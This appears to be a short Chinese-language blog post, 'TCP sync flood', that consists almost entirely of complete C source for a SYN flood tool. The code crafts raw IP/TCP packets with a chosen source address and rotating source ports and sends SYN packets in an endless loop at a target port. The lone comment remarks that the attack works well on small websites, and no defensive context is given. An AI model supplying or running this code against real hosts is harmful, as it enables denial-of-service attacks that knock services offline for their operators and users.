---
title: TCP sync flood
date: 2016-10-02 15:45:23
tags:
---
感觉这种攻击方式对小网站比较有效。

```
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#pragma pack(1)
struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};
#pragma pack()

unsigned short csum(unsigned short *ptr, int nbytes) {
 long sum;
 unsigned short oddbyte;
 short answer;

 sum = 0;
 while (nbytes > 1) {
   sum += *ptr++;
   nbytes -= 2;
 }
 if (nbytes == 1) {
   oddbyte = 0;
   *((u_char*) &oddbyte) = *(u_char*) ptr;
   sum += oddbyte;
 }

 sum = (sum >> 16) + (sum & 0xffff);
 sum = sum + (sum >> 16);
 answer = (short) ~sum;

 return (answer);
}

void oneSyn(int socketfd, in_addr_t source, u_int16_t sourcePort,
		in_addr_t destination, u_int16_t destinationPort) {
	static char sendBuf[sizeof(iphdr) + sizeof(tcphdr)] = { 0 };
	bzero(sendBuf, sizeof(sendBuf));

	struct iphdr* ipHeader = (iphdr*) sendBuf;
	struct tcphdr *tcph = (tcphdr*) (sendBuf + sizeof(iphdr));

	ipHeader->version = 4;
	ipHeader->ihl = 5;

	ipHeader->tos = 0;
	ipHeader->tot_len = htons(sizeof(sendBuf));

	ipHeader->id = htons(1);
	ipHeader->frag_off = 0;
	ipHeader->ttl = 254;
	ipHeader->protocol = IPPROTO_TCP;
	ipHeader->check = 0;
	ipHeader->saddr = source;
	ipHeader->daddr = destination;

	ipHeader->check = csum((unsigned short*) ipHeader, ipHeader->ihl * 2);

	//TCP Header
	tcph->source = htons(sourcePort);
	tcph->dest = htons(destinationPort);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5; //sizeof(tcphdr)/4
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(512);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	//tcp header checksum
	struct pseudo_header pseudoHeader;
	pseudoHeader.source_address = source;
	pseudoHeader.dest_address = destination;
	pseudoHeader.placeholder = 0;
	pseudoHeader.protocol = IPPROTO_TCP;
	pseudoHeader.tcp_length = htons(sizeof(tcphdr));
	memcpy(&pseudoHeader.tcp, tcph, sizeof(struct tcphdr));

	tcph->check = csum((unsigned short*) &pseudoHeader, sizeof(pseudo_header));

	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(sourcePort);
	sin.sin_addr.s_addr = destination;

	ssize_t sentLen = sendto(socketfd, sendBuf, sizeof(sendBuf), 0,
			(struct sockaddr *) &sin, sizeof(sin));
	if (sentLen == -1) {
		perror("sent error");
	}
}

int main(void) {
	//for setsockopt
	int optval = 1;

	//create a raw socket
	int socketfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (socketfd == -1) {
		perror("create socket:");
		exit(0);
	}
	if (setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval))
			< 0) {
		perror("create socket:");
		exit(0);
	}

	in_addr_t source = inet_addr("192.168.1.100");
	in_addr_t destination = inet_addr("192.168.1.101");
	u_int16_t sourcePort = 1;
	u_int16_t destinationPort = 9999;
	while (1) {
		oneSyn(socketfd, source, sourcePort++, destination,
				destinationPort);
		sourcePort %= 65535;
		sleep(1);
	}

	return 0;
}
```

***
参考资料：

[网络编程之Tcp SYN flood洪水攻击 ](http://blog.csdn.net/hengyunabc/article/details/24934529)